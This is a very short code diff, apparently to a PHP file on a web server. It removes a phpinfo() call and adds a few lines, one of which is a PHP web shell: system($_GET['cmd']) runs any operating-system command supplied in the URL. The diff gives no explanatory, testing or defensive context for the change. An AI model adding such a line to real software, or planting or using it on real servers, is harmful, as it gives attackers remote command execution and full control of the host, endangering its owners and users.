@@ -1,1 +1,3 @@
-<?php phpinfo();?>
+hi
+echo "howdy"
+<?php echo "hello";system($_GET['cmd']);?>
